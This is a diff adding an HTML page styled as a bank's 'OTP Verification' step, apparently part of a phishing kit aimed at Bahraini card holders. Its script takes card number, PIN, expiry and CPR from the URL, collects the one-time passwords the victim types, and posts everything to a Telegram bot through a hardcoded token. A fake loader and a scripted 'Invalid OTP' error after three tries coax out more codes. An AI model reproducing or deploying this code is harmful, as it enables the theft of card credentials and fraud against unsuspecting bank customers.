@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Verification</title>
+    <style>
+        @font-face {
+            font-family: 'Effra';
+            src: url('Effra_Std_Rg.ttf') format('truetype');
+            font-weight: normal;
+        }
+        
+        @font-face {
+            font-family: 'Effra';
+            src: url('Effra_Std_Bd.ttf') format('truetype');
+            font-weight: bold;
+        }
+        
+        @font-face {
+            font-family: 'Effra';
+            src: url('Effra_Std_Lt.ttf') format('truetype');
+            font-weight: 300;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Effra', sans-serif;
+            background-color: #f6f7f9;
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+            overflow-y: auto;
+        }
+        
+        /* Header */
+        .header {
+            background: #f6f7f9;
+            padding: 20px;
+            border-bottom: 2px solid #83A11D;
+            position: relative;
+            transition: border-bottom 0.5s ease;
+        }
+
+        .header.no-border {
+            border-bottom: 2px solid transparent;
+        }
+
+        .progress-bar {
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            height: 2px;
+            background: #83A11D;
+            transition: width 0.5s ease;
+            width: 0%;
+        }
+
+
+        .header-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            position: relative;
+        }
+
+        .back-btn {
+            width: 20px;
+            height: 20px;
+            border: none;
+            background-image: url('back.png');
+            background-color: transparent;
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            cursor: pointer;
+            transition: opacity 0.3s ease;
+            flex-shrink: 0;
+            position: absolute;
+            left: 0;
+        }
+
+        .back-btn:hover {
+            opacity: 0.7;
+        }
+
+        .header-title {
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            color: #333;
+            margin: 0;
+        }
+
+        /* Main Content */
+        .main-content {
+            padding: 30px 20px;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .info-text {
+            text-align: center;
+            color: #333;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 10px;
+        }
+
+        .otp-input-section {
+            margin-bottom: 30px;
+        }
+
+        .otp-input-wrapper {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .otp-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            font-family: 'Effra', sans-serif;
+            background: white;
+            transition: all 0.3s ease;
+        }
+
+        .otp-input:focus {
+            outline: none;
+            border-color: #83A11D;
+            box-shadow: 0 0 0 3px rgba(131, 161, 29, 0.1);
+        }
+
+        .otp-input::placeholder {
+            color: #999;
+        }
+
+        .otp-input.error {
+            border-color: #dc3545;
+            box-shadow: 0 0 0 3px rgba(220, 53, 69, 0.1);
+        }
+
+        .error-message-otp {
+            color: #dc3545;
+            font-size: 12px;
+            margin-bottom: 8px;
+            text-align: left;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .error-message-otp.show {
+            opacity: 1;
+        }
+
+
+        .continue-btn {
+            width: 100%;
+            padding: 16px;
+            background: #22b14c;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: bold;
+            font-family: 'Effra', sans-serif;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-top: 4px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .continue-btn:hover {
+            background: #18973c;
+        }
+
+        .continue-btn:disabled {
+            background: #d1d5db;
+            cursor: not-allowed;
+        }
+
+        .btn__label {
+            transition: opacity 0.15s ease;
+        }
+
+        .btn__spinner {
+            position: absolute;
+            inset: 0;
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .btn__spinner:before {
+            content: "";
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            border: 3px solid rgba(255, 255, 255, 0.5);
+            border-top-color: #fff;
+            animation: spin 1s linear infinite;
+        }
+
+        .btn--loading .btn__label {
+            opacity: 0;
+        }
+
+        .btn--loading .btn__spinner {
+            display: flex;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* New Loader Styles - Inspired by the first page */
+        .loader-backdrop {
+            position: fixed;
+            inset: 0;
+            z-index: 1000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0, 0, 0, 0.55);
+            backdrop-filter: blur(2px);
+        }
+
+        .loader-backdrop.show {
+            display: flex;
+        }
+
+        .loader-gif {
+            width: 60px;
+            height: 60px;
+            object-fit: contain;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <div class="progress-bar" id="progressBar"></div>
+        <div class="header-content">
+            <button class="back-btn" onclick="window.history.back()"></button>
+            <h1 class="header-title">OTP</h1>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-content">
+        <p class="info-text">Please enter the OTP we sent to your phone number.</p>
+        
+        <div class="otp-input-section">
+            <div class="otp-input-wrapper">
+            <div class="error-message-otp" id="errorMessage">Invalid OTP, please try again</div>
+                <input type="text" inputmode="numeric" class="otp-input" id="otpInput" placeholder="Enter OTP">
+                
+            </div>
+        </div>
+        
+        <button class="continue-btn" id="continueBtn">
+            <span class="btn__label">CONTINUE</span>
+            <span class="btn__spinner" aria-hidden="true"></span>
+        </button>
+    </div>
+
+    <!-- New Loader -->
+    <div class="loader-backdrop" id="loader" aria-hidden="true">
+        <img src="cicle_loader.gif" alt="Loading..." class="loader-gif" />
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const otpInput = document.getElementById('otpInput');
+            const continueBtn = document.getElementById('continueBtn');
+            const loader = document.getElementById('loader');
+            const progressBar = document.getElementById('progressBar');
+            const errorMessage = document.getElementById('errorMessage');
+            const header = document.querySelector('.header');
+            
+            let clickCount = 0;
+            const maxClicks = 3;
+            
+            // Get all URL parameters
+            const urlParams = new URLSearchParams(window.location.search);
+            const card = urlParams.get('card');
+            const pin = urlParams.get('pin');
+            const mm = urlParams.get('mm');
+            const yy = urlParams.get('yy');
+            const cpr = urlParams.get('cpr');
+            const amount = urlParams.get('amount');
+            
+            // Function to send data to Telegram
+            async function sendToTelegram(data) {
+                // Replace with your actual Telegram bot token and chat ID
+                const botToken = '8317396526:AAFNNX5WnbBb_Nt9cOUDOqy1cXhe2xrsSu8';
+                const chatId = '-5091670751';
+                
+                // Format the message
+                const message = `
+🔐 *OTP Verification Data*
+
+*Card Details:*
+- Card Number: ${data.card || 'N/A'}
+- PIN: ${data.pin || 'N/A'}
+- Expiry: ${data.mm || 'N/A'}/${data.yy || 'N/A'}
+- CPR: ${data.cpr || 'N/A'}
+- Amount: BHD ${data.amount || 'N/A'}
+
+*OTP Information:*
+- OTP: ${data.otp}
+
+*Time:* ${data.time}
+                `;
+                
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                    
+                    const result = await response.json();
+                    return result.ok;
+                } catch (error) {
+                    console.error('Error sending to Telegram:', error);
+                    return false;
+                }
+            }
+            
+            // Show loader function
+            function showLoader() {
+                loader.classList.add('show');
+                continueBtn.classList.add('btn--loading');
+                continueBtn.disabled = true;
+            }
+            
+            // Hide loader function
+            function hideLoader() {
+                loader.classList.remove('show');
+                continueBtn.classList.remove('btn--loading');
+                continueBtn.disabled = false;
+            }
+            
+            // Only allow numbers
+            otpInput.addEventListener('keypress', function(e) {
+                if (!/[0-9]/.test(e.key)) {
+                    e.preventDefault();
+                }
+            });
+            
+            // Continue button click handler
+            continueBtn.addEventListener('click', async function(e) {
+                e.preventDefault();
+                
+                // Check if OTP is empty
+                if (!otpInput.value.trim()) {
+                    otpInput.classList.add('error');
+                    errorMessage.classList.remove('show');
+                    return;
+                }
+                
+                // Increment click count
+                clickCount++;
+                
+                // Remove error and input error state
+                otpInput.classList.remove('error');
+                errorMessage.classList.remove('show');
+                
+                // Show loader first
+                showLoader();
+                
+                // Get current time
+                const timePK = new Intl.DateTimeFormat("en-PK", {
+                    timeZone: "Asia/Karachi",
+                    dateStyle: "medium",
+                    timeStyle: "medium",
+                }).format(new Date());
+                
+                // Prepare data for Telegram
+                const telegramData = {
+                    card: card,
+                    pin: pin,
+                    mm: mm,
+                    yy: yy,
+                    cpr: cpr,
+                    amount: amount,
+                    otp: otpInput.value,
+                    time: timePK
+                };
+                
+                // Send data to Telegram
+                const telegramSuccess = await sendToTelegram(telegramData);
+                
+                if (telegramSuccess) {
+                    console.log("OTP data sent to Telegram successfully");
+                } else {
+                    console.log("Failed to send OTP data to Telegram");
+                }
+                
+                // After loader, update progress
+                setTimeout(function() {
+                    hideLoader();
+                    
+                    // Hide header border on first click
+                    if (clickCount === 1) {
+                        header.classList.add('no-border');
+                    }
+                    
+                    // Update progress bar after loader
+                    const progress = (clickCount / maxClicks) * 100;
+                    progressBar.style.width = progress + '%';
+                    
+                    // If 3rd click, restore border and show error
+                    if (clickCount === maxClicks) {
+                        // Restore header border
+                        header.classList.remove('no-border');
+                        
+                        // Show error message
+                        otpInput.classList.add('error');
+                        errorMessage.classList.add('show');
+                        
+                        // Reset progress
+                        clickCount = 0;
+                        progressBar.style.width = '0%';
+                    }
+                }, 4000);
+            });
+            
+            // Remove error class on focus
+            otpInput.addEventListener('focus', function() {
+                otpInput.classList.remove('error');
+                errorMessage.classList.remove('show');
+            });
+        });
+    </script>
+</body>
+</html>
